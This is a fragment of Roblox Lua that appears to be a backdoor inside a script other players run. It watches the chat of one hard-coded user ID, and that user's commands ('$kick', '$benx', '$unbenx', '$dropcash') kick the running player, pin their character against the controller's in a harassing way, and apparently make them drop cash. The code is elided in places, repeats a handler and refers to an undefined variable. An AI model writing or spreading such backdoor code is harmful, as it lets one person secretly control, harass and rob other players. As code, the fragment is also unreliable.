while true do 
	local p1_lua = game:GetService("Players"):GetPlayerByUserId(2604028397) --12xErykk2
		if p1_lua then
		...
		p1_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p1_lua then
		...
		p1_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p1_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p1_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p1_lua.Character.HumanoidRootPart.CFrame + p1_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p1_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p1_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p1_lua.Character.UpperTorso.Position)
				end
			end
		...
		p1_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p1_lua then
					game.Players.LocalPlayer:Kick("Kicked by p1_lua user")
				end
			end
		...
		p1_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p1_lua2 then
